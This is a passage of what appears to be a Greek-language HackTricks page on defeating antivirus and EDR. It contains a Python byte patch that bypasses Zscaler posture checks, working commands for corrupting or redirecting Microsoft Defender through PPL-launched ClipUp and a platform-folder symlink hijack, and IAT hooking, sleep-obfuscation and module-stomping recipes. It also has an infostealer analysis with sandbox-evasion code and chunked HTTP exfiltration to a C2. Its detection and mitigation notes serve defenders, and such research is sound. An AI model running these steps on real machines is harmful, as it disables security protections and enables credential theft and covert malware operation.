replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι posture checks εμφανίζονται **πράσινοι/συμβατοί**.
* Unsigned ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο compromised host αποκτά unrestricted πρόσβαση στο internal network που ορίζεται από τα Zscaler policies.

Αυτό το case study δείχνει πώς οι αποφάσεις εμπιστοσύνης μόνο από τον client-side και οι απλοί signature checks μπορούν να παρακαμφθούν με λίγα byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level ώστε μόνο processes με ίσο ή υψηλότερο protection να μπορούν να πειράζουν το ένα το άλλο. Offensive, αν μπορείς να εκκινήσεις νόμιμα ένα PPL-enabled binary και να ελέγχεις τα arguments του, μπορείς να μετατρέψεις τη benign λειτουργικότητα (π.χ. logging) σε ένα constrained, PPL-backed write primitive απέναντι σε protected directories που χρησιμοποιούνται από AV/EDR.

Τι κάνει ένα process να τρέχει ως PPL
- Το target EXE (και οποιαδήποτε loaded DLLs) πρέπει να είναι signed με ένα PPL-capable EKU.
- Το process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Τα λάθος levels θα αποτύχουν στη δημιουργία.

Δες επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στο LSASS protection εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns και δέχεται μία παράμετρο για να γράψει ένα log file σε path που καθορίζει ο caller.
- Όταν εκτελείται ως PPL process, το file write γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να κάνει parse paths που περιέχουν spaces· χρησιμοποίησε 8.3 short paths για να δείξεις μέσα σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα short names: `dir /x` σε κάθε parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκίνηση του PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Πέρασε το ClipUp log-path argument για να αναγκάσεις δημιουργία file σε προστατευμένο AV directory (π.χ. Defender Platform). Χρησιμοποίησε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως open/locked από το AV ενώ τρέχει (π.χ. MsMpEng.exe), προγραμμάτισε το write στο boot πριν ξεκινήσει το AV εγκαθιστώντας ένα auto-start service που τρέχει αξιόπιστα νωρίτερα. Επαλήθευσε το boot ordering με Process Monitor (boot logging).
4) Στο reboot το PPL-backed write γίνεται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και εμποδίζοντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
## Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις το περιεχόμενο που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο για corruption και όχι για ακριβή content injection.
- Απαιτεί local admin/SYSTEM για να εγκαταστήσεις/εκκινήσεις μια service και ένα reboot window.
- Ο συγχρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση στο boot-time αποφεύγει file locks.

## Detections
- Process creation του `ClipUp.exe` με ασυνήθιστες arguments, ειδικά όταν parent είναι non-standard launchers, γύρω από το boot.
- Νέες services ρυθμισμένες να auto-start suspicious binaries και να ξεκινούν σταθερά πριν από Defender/AV. Ερεύνησε service creation/modification πριν από failures στην εκκίνηση του Defender.
- File integrity monitoring σε Defender binaries/Platform directories· απρόσμενα file creations/modifications από processes με protected-process flags.
- ETW/EDR telemetry: αναζήτησε processes που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση PPL level από non-AV binaries.

## Mitigations
- WDAC/Code Integrity: περιόρισε ποια signed binaries μπορούν να εκτελεστούν ως PPL και υπό ποιους parents· μπλόκαρε την κλήση του ClipUp εκτός legit contexts.
- Service hygiene: περιόρισε τη δημιουργία/τροποποίηση auto-start services και παρακολούθησε manipulation της σειράς εκκίνησης.
- Βεβαιώσου ότι το Defender tamper protection και τα early-launch protections είναι ενεργά· ερεύνησε startup errors που δείχνουν binary corruption.
- Σκέψου να απενεργοποιήσεις τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling αν είναι συμβατό με το περιβάλλον σου (δοκίμασε διεξοδικά).

## References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την platform από την οποία θα τρέξει enumerating subfolders κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`), και μετά ξεκινά τα Defender service processes από εκεί (ενημερώνοντας αντίστοιχα service/registry paths). Αυτή η επιλογή εμπιστεύεται directory entries, συμπεριλαμβανομένων directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να πετύχει DLL sideloading ή service disruption.

### Preconditions
- Local Administrator (απαιτείται για να δημιουργήσεις directories/symlinks κάτω από το Platform folder)
- Δυνατότητα reboot ή trigger του Defender platform re-selection (service restart στο boot)
- Απαιτούνται μόνο built-in tools (mklink)

### Why it works
- Το Defender μπλοκάρει writes στους δικούς του φακέλους, αλλά το platform selection εμπιστεύεται directory entries και επιλέγει το lexicographically highest version χωρίς να επαληθεύει ότι το target επιλύεται σε protected/trusted path.

### Step-by-step (example)
1) Ετοίμασε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιούργησε ένα symlink καταλόγου με υψηλότερη έκδοση μέσα στο Platform που να δείχνει στον φάκελό σου:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή ενεργοποίησης (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από τη ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε το νέο process path κάτω από `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/registry που αντικατοπτρίζει αυτήν την τοποθεσία.

Επιλογές post-exploitation
- DLL sideloading/code execution: Drop/replace DLLs που το Defender φορτώνει από το application directory του για να εκτελέσετε code μέσα στα Defender’s processes. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στο επόμενο start το configured path να μην resolve και το Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημείωσε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Τα Red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module κάνοντας hooking το Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει το evasion πέρα από τη μικρή API surface που εκθέτουν πολλά kits (π.χ. CreateProcessA), και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Στήσε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Καθώς φορτώνεται το host DLL, κάνε walk το IMAGE_IMPORT_DESCRIPTOR του και κάνε patch τα IAT entries για τα targeted imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail‑call στο πραγματικό API address. Τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από το call (π.χ. encrypt beacon regions, RWX→RX, αλλάξτε page names/permissions) και μετά restore post‑call.
- Call‑stack spoofing: κατασκεύασε ένα benign stack και πέρασε στο target API ώστε η call‑stack analysis να καταλήγει σε αναμενόμενα frames.
- Για compatibility, κάνε export ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρεί ποια APIs θα γίνουν hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Λειτουργεί για κάθε code που χρησιμοποιεί το hooked import, χωρίς να τροποποιεί τον tool code ή να βασίζεται στο Beacon για να proxy συγκεκριμένα APIs.
- Καλύπτει post‑ex DLLs: hooking LoadLibrary* σου επιτρέπει να intercept module loads (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόσεις το ίδιο masking/stack evasion στις API calls τους.
- Αποκαθιστά αξιόπιστη χρήση process‑spawning post‑ex commands απέναντι σε call‑stack–based detections, μέσω wrapping του CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του loaded module.
- Κράτα τα wrappers μικρά και PIC-safe· επίλυσε το true API μέσω της original IAT value που κατέγραψες πριν το patching ή μέσω LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για PIC και απόφυγε να αφήνεις writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs χτίζουν ένα fake call chain (return addresses μέσα σε benign modules) και μετά pivot στο real API.
- Αυτό παρακάμπτει detections που περιμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδύασέ το με stack cutting/stack stitching techniques για να προσγειωθείς μέσα σε expected frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader πριν από τα post-ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρήσεις target APIs ώστε το Beacon και τα BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- IAT integrity: entries που επιλύονται σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlGetCurrentThreadStart ancestry.
- Loader telemetry: in-process writes σε IAT, early DllMain activity που τροποποιεί import thunks, απροσδόκητες RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν κάνεις hooking LoadLibrary*, παρακολούθησε ύποπτα loads automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που κάνουν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook imports **during** `ProcessImports()` αντικαθιστώντας το loader's `GetProcAddress` pointer με έναν custom resolver που ελέγχει πρώτα τα hooks:

- Φτιάξε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC απελευθερώσει τον εαυτό του.
- Κάνε export μια `setup_hooks()` function που αντικαθιστά τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· αλλιώς δώσε το πραγματικό `GetProcAddress`.
- Καταχώρησε hook targets στο link time με Crystal Palace `addhook "MODULE$Func" "hook"` entries. Το hook παραμένει valid επειδή ζει μέσα στο resident PICO.

Αυτό δίνει **import-time IAT redirection** χωρίς patching του code section του loaded DLL post-load.

### Forcing hookable imports when the target uses PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η function υπάρχει πραγματικά στο IAT του target. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε το `ProcessImports()` path του loader να το δει:

- Αντικατάστησε hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά όπως `&WaitForSingleObject`.
- Ο compiler θα παράγει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader επιλύσει τα imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε την κλήση σε μια Ekko-style obfuscation chain που κρυπτογραφεί το in-memory image κατά το idle:

- Χρησιμοποίησε `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
- Τυπική chain (x64): set image σε `PAGE_READWRITE` → RC4 encrypt μέσω `advapi32!SystemFunction032` πάνω από ολόκληρο το mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **restore per-section permissions** περνώντας από PE sections → signal completion.
- Το `RtlCaptureContext` δίνει ένα template `CONTEXT`· κάνε clone σε πολλαπλά frames και set τα registers (`Rip/Rcx/Rdx/R8/R9`) για να καλέσεις κάθε βήμα.

Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`) ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν προς `NtContinue`.
- `advapi32!SystemFunction032` να χρησιμοποιείται σε μεγάλα contiguous image-sized buffers.
- Large-range `VirtualProtect` ακολουθούμενο από custom per-section permission restoration.


## Precision Module Stomping

Το module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στο target process** αντί να κάνει allocation σε obvious private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target πρέπει να είναι ένα **loaded, disk-backed image** του οποίου ο code space μπορεί να απορροφήσει το payload χωρίς να καταστρέψει code paths που το process εξακολουθεί να χρειάζεται.

### Reliable target selection

Το naive stomping σε common modules όπως `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην είναι loaded στο remote process, και μια πολύ μικρή code region θα κάνει το process να crashάρει. Ένα πιο reliable workflow είναι:

1. Κάνε enumerate τα target process modules και κράτα μια **names-only include list** από DLLs που είναι ήδη loaded.
2. Φτιάξε πρώτα το payload και κατέγραψε το **exact byte size** του.
3. Σκάναρε candidate DLLs στο disk και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν mapped in memory**.
4. Κάνε parse το **Export Address Table (EAT)** και διάλεξε ένα exported function RVA ως το stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το boundary της επιλεγμένης function, θα overwrite γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Λειτουργικές σημειώσεις
- Προτίμησε DLLs **ήδη φορτωμένα** στο remote process για να αποφύγεις την τηλεμετρία του `LoadLibrary`/unexpected image loads.
- Προτίμησε exports που εκτελούνται σπάνια από το target application, αλλιώς οι normal code paths μπορεί να περάσουν από τα stomped bytes πριν ή μετά το thread creation.
- Μεγάλα implants συχνά απαιτούν αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer** ώστε ολόκληρο το buffer να αναπαριστάται σωστά στο injector source.

Ιδέες ανίχνευσης
- Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις πιο συνηθισμένες private RWX/RX allocations.
- Export entry points των οποίων τα bytes in-memory δεν ταιριάζουν πλέον με το backing file on disk.
- Remote threads ή context pivots που ξεκινούν εκτέλεση μέσα σε ένα νόμιμο DLL export του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` απέναντι σε DLL `.text` pages ακολουθούμενες από thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

Το SantaStealer (aka BluelineStealer) δείχνει πώς οι σύγχρονοι info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.

### Keyboard layout gating & sandbox delay

- Μια config flag (`anti_cis`) απαριθμεί τα installed keyboard layouts μέσω `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample ρίχνει έναν κενό `CIS` marker και τερματίζει πριν τρέξει stealers, διασφαλίζοντας ότι δεν θα ενεργοποιηθεί ποτέ σε excluded locales ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Λογική `check_antivm` σε επίπεδα

- Η Variant A διατρέχει τη λίστα διεργασιών, κάνει hash κάθε ονόματος με ένα custom rolling checksum, και το συγκρίνει με embedded blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum στο όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Η Variant B επιθεωρεί system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions, και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit τερματίζει πριν γίνει launch των modules.

### Fileless helper + double ChaCha20 reflective loading

- Το primary DLL/EXE ενσωματώνει ένα Chromium credential helper που είτε γράφεται στο δίσκο είτε γίνεται manual map in-memory· η fileless mode επιλύει μόνο του imports/relocations ώστε να μη γράφονται artifacts του helper.
- Αυτός ο helper αποθηκεύει ένα δεύτερο-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο 32-byte keys + 12-byte nonces). Μετά και τα δύο περάσματα, το φορτώνει reflectively (χωρίς `LoadLibrary`) και καλεί exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ChromElevator routines χρησιμοποιούν direct-syscall reflective process hollowing για να injectάρουν σε ένα live Chromium browser, να κληρονομήσουν AppBound Encryption keys, και να decryptάρουν passwords/cookies/credit cards απευθείας από SQLite databases παρά το ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- Το `create_memory_based_log` διατρέχει έναν global `memory_generators` function-pointer table και δημιουργεί ένα thread ανά ενεργό module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει το file count του μετά από ένα join window ~45s.
- Μόλις ολοκληρωθεί, τα πάντα γίνονται zip με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` έπειτα κοιμάται 15s και κάνει stream το archive σε 10 MB chunks μέσω HTTP POST στο `http://<C2>:6767/upload`, spoofάροντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk προσθέτει `complete: true` ώστε το C2 να ξέρει ότι η reassembly έχει ολοκληρωθεί.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
